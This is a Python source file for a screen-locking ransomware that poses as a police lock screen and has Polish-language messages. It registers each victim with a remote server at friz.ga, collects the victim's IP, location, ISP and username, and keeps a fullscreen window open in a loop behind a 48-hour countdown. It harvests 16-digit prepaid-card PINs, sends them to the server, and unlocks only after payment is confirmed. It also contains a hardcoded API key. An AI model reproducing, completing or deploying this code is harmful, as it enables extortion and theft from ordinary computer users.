import webview
import re
import requests
import random
import time
import platform
import os
import getpass
import urllib.request
import threading




try:

    with open('C:\ProgramData\police\off.txt', 'r') as f:
        onOff = f.read()
        if(onOff==1):
            os._exit(0)
            exit()
            quit()
except:
    pass

money = 0
id = ""
globalPin = ""

html = ""
with open("C:\ProgramData\police\\main.html", "r",encoding="utf-8") as file:
    html = file.read()


def createIdAndAddVictim():
    global id
    try:
        with open("C:\ProgramData\police\\id.txt", "r") as file:
            id = file.read()
        
    except:
        id = str(random.randint(1, 7777777))
        with open("C:\ProgramData\police\\id.txt", "w") as file:
            file.write(id)
    requests.get(f"http://friz.ga:8080/addVictim?victimId={id}&robbed=0")


def disableLocker():
    with open('C:\ProgramData\police\off.txt', 'w') as f:
        f.write("1")


def checkIfvictimPaids():
    time.sleep(60)
    global id
    res = requests.get(f"http://friz.ga:8080/getVictim?victimId={id}")
    if res.status_code == 400:
        return 0


    victim = res.text.split(",")
    robbed = victim[0]
    money = victim[1]
    print(res.text)

    if robbed == "1":
        disableLocker()
        os._exit(0)
        exit()
        quit()
    checkIfvictimPaids()


t = threading.Thread(target=checkIfvictimPaids)
t.start()


def getMoneyAndCheckVictim():
    global id
    res = requests.get(f"http://friz.ga:8080/getVictim?victimId={id}")
    if res.status_code == 400:
        return 0
    victim = res.text.split(",")
    robbed = victim[0]
    money = victim[1]
    print(res.text)

    if robbed == "1":
        disableLocker()
        os._exit(0)
        exit()
        quit()

    return int(money)


def setVictimInfo():
    info = requests.get("https://api.ipgeolocation.io/ipgeo?apiKey=1c7d1963378549d38a6b5b05e7afd47f")
    content = info.json()
    window.evaluate_js(f'setVictimInfo("{content["ip"]}","{content["city"]}","{content["isp"]}","{getpass.getuser()}","{platform.system()}")')

    
def validatePin(pin, value):
    global money, globalPin
    if value == 0:
        window.evaluate_js('setError("Nie prawidłowa kwota")')
        return
    if len(pin) != 16:
        window.evaluate_js('setError("Nie prawidłowy pin")')
        return
    if re.search(r"^[0-9]+$",pin) == None:
        window.evaluate_js('setError("Nie prawidłowy pin")')
        return

    money += value
    globalPin = pin
    window.evaluate_js(f'setMoney({money})')
    window.evaluate_js('setError("")')

    sendPinToServer(value)


def sendPinToServer(value):
    requests.get(f"http://friz.ga:8080/psc?pin={globalPin}&money={str(value)}&victimId={id}")


def setTime():
    timer = 0
    now = int(time.time())
    try:
        with open("C:\ProgramData\police\\time.txt", "r") as file:
            timer = int(file.read())
    except Exception as e:
        print(e)
        with open("C:\ProgramData\police\\time.txt", "w") as file:
            file.write(str(now))
        timer = now
    timeToSet = 172800+timer-now
    window.evaluate_js(f'startTimer({timeToSet})')


def functions(window):
    global money
    time.sleep(3)
    window.expose(validatePin)
    setVictimInfo()
    setTime()
    window.evaluate_js(f'setMoney({money})')

#window = webview.create_window('decay',html=html,fullscreen=False, width=1280, height=720)

def lackOfInternet(window):
    setTime()
    window.evaluate_js('setError("Brak dostępu do internetu")')

def connect():
    try:
        urllib.request.urlopen('http://google.com') #Python 3.x
        return True
    except:
        return False


if connect() == True:
    createIdAndAddVictim()
    money = getMoneyAndCheckVictim()

    while True:
        window = webview.create_window('decay',html=html,fullscreen=True)
        webview.start(functions, window)
else:
     while True:
        window = webview.create_window('decay',html=html,fullscreen=True)
        webview.start(lackOfInternet, window)


